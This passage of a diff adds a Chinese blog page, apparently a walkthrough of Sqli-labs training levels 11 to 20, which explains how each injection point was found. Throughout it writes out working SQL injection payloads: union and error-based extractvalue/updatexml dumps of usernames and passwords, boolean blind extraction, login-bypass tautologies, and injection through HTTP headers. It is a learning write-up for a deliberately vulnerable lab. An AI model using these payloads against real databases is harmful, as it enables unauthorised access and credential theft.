+<h3 id="6-爆表中数据"><a href="#6-爆表中数据" class="headerlink" title="6.爆表中数据"></a>6.爆表中数据</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/11%E6%95%B0%E6%8D%AE.png" alt="11数据"></p>
+<p>-1’ union select 1,group_concat(username,”-“,password) from users #</p>
+<p>‘union select null,group_concat(username,0x3a,password) from users #</p>
+<h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><h3 id="1-判断注入点-6"><a href="#1-判断注入点-6" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/12%E6%B3%A8%E5%85%A5%E7%82%B93.png" alt="12注入点3"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/12%E6%B3%A8%E5%85%A5%E7%82%B92.png" alt="12注入点2"></p>
+<p>输入双引号报错，根据提示加上括号</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/12%E6%B3%A8%E5%85%A5%E7%82%B91.png" alt="12注入点1"></p>
+<p>1”) and 1&#x3D;1#</p>
+<p>说明为post型基于错误的双引号加括号注入</p>
+<p>其余同第十一关</p>
+<h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><h3 id="1-判断注入点-7"><a href="#1-判断注入点-7" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/13%E6%B3%A8%E5%85%A5%E7%82%B91.png" alt="13注入点1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/13%E6%B3%A8%E5%85%A5%E7%82%B92.png" alt="13注入点2"></p>
+<p>1’) and 1&#x3D;1#</p>
+<p>登录成功发现不在返回用户名和密码信息</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/13%E7%99%BB%E5%BD%95.png" alt="13登录"></p>
+<h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/13%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.png" alt="13数据库名"></p>
+<p>1’) and(select extractvalue(1,concat(0x7e,(select database())))) #</p>
+<h3 id="3-爆数据库中的表"><a href="#3-爆数据库中的表" class="headerlink" title="3.爆数据库中的表"></a>3.爆数据库中的表</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/13%E8%A1%A8%E5%90%8D.png" alt="13表名"></p>
+<p>1’) and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())))) #</p>
+<h3 id="4-爆表中字段"><a href="#4-爆表中字段" class="headerlink" title="4.爆表中字段"></a>4.爆表中字段</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/13%E5%AD%97%E6%AE%B5.png" alt="13字段"></p>
+<p>1’) and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;”users”)))) #</p>
+<h3 id="5-爆表中信息"><a href="#5-爆表中信息" class="headerlink" title="5.爆表中信息"></a>5.爆表中信息</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/13%E4%BF%A1%E6%81%AF1.png" alt="13信息1"></p>
+<p>1’) and(select extractvalue(1,concat(0x7e,(select group_concat(username,”-“,password) from users)))) #</p>
+<p>由于有32位的限制 查不全 需要手动更改条件</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/13%E4%BF%A1%E6%81%AF2.png" alt="13信息2"></p>
+<p>1’) and(select extractvalue(1,concat(0x7e,(select group_concat(username,”-“,password) from users where username not in (“Dumb”,’Angelina’))))) #</p>
+<p>以此类推得出所有信息</p>
+<h2 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h2><p>注入点为双引号，其余同第十三关</p>
+<h2 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h2><h3 id="1-判断注入点-8"><a href="#1-判断注入点-8" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><p>经测试发现无论输入什么都没有报错信息，所以使用时间盲注（存疑）</p>
+<p>(也可以根据下面字的颜色变化使用布尔盲注，下面使用的是布尔盲注)</p>
+<p><strong>与less9中判断注入点的方法不同，GET型与POST型不同！！！</strong></p>
+<p>POST型中要判断字符型注入，最快的方法就是利用“万能语句”，即：</p>
+<p> 1 or 1&#x3D;1 – # ，   1) or 1&#x3D;1– # ，    1)) or 1&#x3D;1– #</p>
+<p> 1’ or 1&#x3D;1 – # ，  1’) or 1&#x3D;1– # ，   1’) or 1&#x3D;1– #</p>
+<p> 1” or 1&#x3D;1 – #，   1”) or 1&#x3D;1– # ，   1”) or 1&#x3D;1– # 等。。</p>
+<p> 一般POST型使用1’ or 1&#x3D;1 – #和1” or 1&#x3D;1 – # 成功的概率最大因单双引号引起的闭合问题更大点</p>
+<p> <img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/15%E6%B3%A8%E5%85%A5%E7%82%B91.png" alt="15注入点1"></p>
+<p> <img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/15%E6%B3%A8%E5%85%A5%E7%82%B92.png" alt="15注入点2"></p>
+<p> 可得出为单引号POST型时间盲注</p>
+<h3 id="2-获取数据库数据库名长度"><a href="#2-获取数据库数据库名长度" class="headerlink" title="2.获取数据库数据库名长度"></a>2.获取数据库数据库名长度</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/15%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A61.png" alt="15数据库长度1"></p>
+<p>可得出数据库长度为8</p>
+<h3 id="3-获取数据库名-1"><a href="#3-获取数据库名-1" class="headerlink" title="3.获取数据库名"></a>3.获取数据库名</h3><p>获得数据库名第一个字母ASCII码为115，字母为s</p>
+<p> <img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/15%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D1.png" alt="15数据库名1"></p>
+<p> 1’ or ascii(substr(database(),1,1))&#x3D;115 #</p>
+<p>以此类推得出数据库名为security</p>
+<h3 id="4-获取数据库表名-1"><a href="#4-获取数据库表名-1" class="headerlink" title="4.获取数据库表名"></a>4.获取数据库表名</h3><blockquote>
+<p>获得表的个数</p>
+</blockquote>
+<p>1’ or (select count(*) from information_schema.tables where table_schema&#x3D;database())&#x3D;4 #</p>
+<p>可得出数据库中有4个表</p>
+<blockquote>
+<p>获得表名长度</p>
+</blockquote>
+<p>第一个表的表名长度为：6</p>
+<p>1’ or (select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1)&#x3D;6 #</p>
+<p>得出其余三个表长分别为：8、7、5</p>
+<blockquote>
+<p>获取表名</p>
+</blockquote>
+<p>获得数据库第一个表的名称的第一个字母ASCII码为101，字母为e</p>
+<p>1’ or ascii((substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)))&#x3D;101 #</p>
+<p>以此类推得出四个表分别为emails、referers、uagents、users</p>
+<h3 id="5-获取数据库列名-1"><a href="#5-获取数据库列名-1" class="headerlink" title="5.获取数据库列名"></a>5.获取数据库列名</h3><blockquote>
+<p>获取列的个数</p>
+</blockquote>
+<p>1’ or (select count(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’)&#x3D;3 #</p>
+<p>可得出users表内有3列</p>
+<blockquote>
+<p>获取列名长度</p>
+</blockquote>
+<p>1’ or (select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1,1)&#x3D;8 #</p>
+<blockquote>
+<p>获取列名</p>
+</blockquote>
+<p>第一列的名称的第一个字母的ASCII码为：105，字母为：i</p>
+<p>1’ or (ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1)))&#x3D;105#</p>
+<p>以此类推得出三列分别为id、username、password</p>
+<h3 id="6-获取数据-1"><a href="#6-获取数据-1" class="headerlink" title="6.获取数据"></a>6.获取数据</h3><blockquote>
+<p>获取行数</p>
+</blockquote>
+<p>1’ or (select count(id) from users)&#x3D;13 #</p>
+<blockquote>
+<p>获取数据</p>
+</blockquote>
+<p>第一行第一个字母的ASCII码为68，字母为D</p>
+<p>1’ or ascii(substr((select username from users limit 0,1),1,1))&#x3D;68 #</p>
+<p>同理可得出username和password的所有信息</p>
+<h2 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h2><p>注入点为”)，其余同第十五关</p>
+<h2 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h2><h3 id="1-判断注入点-9"><a href="#1-判断注入点-9" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><p>题目为修改密码，所以用户名是已知的</p>
+<p>经过测试，为注入点为password上的单引号，且有回显，可以使用报错注入</p>
+<h3 id="2-爆数据库名"><a href="#2-爆数据库名" class="headerlink" title="2.爆数据库名"></a>2.爆数据库名</h3><p>admb’ or extractvalue(1,concat(0x7e,(select database())))#</p>
+<h3 id="3-爆数据库中表名"><a href="#3-爆数据库中表名" class="headerlink" title="3.爆数据库中表名"></a>3.爆数据库中表名</h3><p>1’ and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))#</p>
+<h3 id="4-爆表中列名"><a href="#4-爆表中列名" class="headerlink" title="4.爆表中列名"></a>4.爆表中列名</h3><p>1’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e)) #</p>
+<h3 id="5-爆表中数据（报错）"><a href="#5-爆表中数据（报错）" class="headerlink" title="5.爆表中数据（报错）"></a>5.爆表中数据（报错）</h3><h2 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h2><h2 id="1-判断类型"><a href="#1-判断类型" class="headerlink" title="1.判断类型"></a>1.判断类型</h2><p>admin1 admin1登录</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/18%E5%88%A4%E6%96%AD%E7%B1%BB%E5%9E%8B1.png" alt="18判断类型1"></p>
+<p>类型为HTTP头部user-agent类型</p>
+<h2 id="2-判断注入点"><a href="#2-判断注入点" class="headerlink" title="2.判断注入点"></a>2.判断注入点</h2><p>使用brup抓取登录时的数据包</p>
+<p>（也可使用repeater查看）</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/18%E6%B3%A8%E5%85%A5%E7%82%B91.png" alt="18注入点1"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/18%E6%B3%A8%E5%85%A5%E7%82%B92.png" alt="18注入点2"></p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/18%E6%B3%A8%E5%85%A5%E7%82%B93.png" alt="18注入点3"></p>
+<p>可知注入点为单引号</p>
+<h2 id="3-爆数据库名"><a href="#3-爆数据库名" class="headerlink" title="3.爆数据库名"></a>3.爆数据库名</h2><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/18%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.png" alt="18数据库名"></p>
+<p>‘ and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ‘</p>
+<h2 id="4-爆表"><a href="#4-爆表" class="headerlink" title="4.爆表"></a>4.爆表</h2><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/18%E8%A1%A8%E5%90%8D.png" alt="18表名"></p>
+<p>‘ and updatexml(1,concat(‘#’,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)),0),’’)#</p>
+<p>或’ or updatexml(1,concat(‘#’,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)),0),’’)#</p>
+<h3 id="5-爆字段"><a href="#5-爆字段" class="headerlink" title="5.爆字段"></a>5.爆字段</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/18%E5%AD%97%E6%AE%B5.png" alt="18字段"></p>
+<p>‘ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e)) and ‘</p>
+<p>或’ or updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),0x7e)),1) and ‘1’&#x3D;’1</p>
+<h3 id="6-爆信息"><a href="#6-爆信息" class="headerlink" title="6.爆信息"></a>6.爆信息</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/18%E4%BF%A1%E6%81%AF1.png" alt="18信息1"></p>
+<p>‘ and extractvalue(1,concat(0x7e,(select group_concat(username,”-“,password) from users),0x7e)) and ‘</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/18%E4%BF%A1%E6%81%AF2.png" alt="18信息2"></p>
+<p>‘ and (select extractvalue(1,concat(0x7e,(select group_concat(username,”-“,password) from users where username not in (“Dumb”,’Angelina’))))) and ‘</p>
+<h2 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h2><p>admin admin登录</p>
+<p>类型为HTTP头部referer类型，在referer位置注入，其余与十八关一致</p>
+<h2 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h2><p>admin admin登录</p>
+<p>类型为HTTP头部cookie类型，在cookie位置注入</p>
+<h3 id="1-判断注入点-10"><a href="#1-判断注入点-10" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/20%E6%B3%A8%E5%85%A5%E7%82%B91.png" alt="20注入点1"></p>
+<p>经测试得出注入点为单引号</p>
+<p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/20%E6%B3%A8%E5%85%A5%E7%82%B92.png" alt="20注入点2"></p>
+<h3 id="2-查看当前字段个数"><a href="#2-查看当前字段个数" class="headerlink" title="2.查看当前字段个数"></a>2.查看当前字段个数</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/20%E5%AD%97%E6%AE%B5%E6%95%B0.png" alt="20字段数"></p>
+<h3 id="3-获取数据库名-2"><a href="#3-获取数据库名-2" class="headerlink" title="3.获取数据库名"></a>3.获取数据库名</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.png" alt="20数据库名"></p>
+<h3 id="4-获取所有数据库名（存疑）"><a href="#4-获取所有数据库名（存疑）" class="headerlink" title="4.获取所有数据库名（存疑）"></a>4.获取所有数据库名（存疑）</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/20%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.png" alt="20所有数据库名"></p>
+<h3 id="5-获取表名"><a href="#5-获取表名" class="headerlink" title="5.获取表名"></a>5.获取表名</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/20%E8%A1%A8%E5%90%8D.png" alt="20表名"></p>
+<h3 id="6-获取表中字段"><a href="#6-获取表中字段" class="headerlink" title="6.获取表中字段"></a>6.获取表中字段</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/20%E5%AD%97%E6%AE%B5.png" alt="20字段"></p>
+<h3 id="7-获取信息"><a href="#7-获取信息" class="headerlink" title="7.获取信息"></a>7.获取信息</h3><p><img src="https://raw.githubusercontent.com/Vinslwn/img/main/sqli4-21(2)/20%E4%BF%A1%E6%81%AF.png" alt="20信息"></p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://example.com/2022/03/28/Sqli-labs%EF%BC%884-21%E5%85%B3%EF%BC%89/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://example.com/2022/03/28/Sqli-labs%EF%BC%884-21%E5%85%B3%EF%BC%89/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//http-miccall-tech.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a target="_blank" rel="noopener" href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
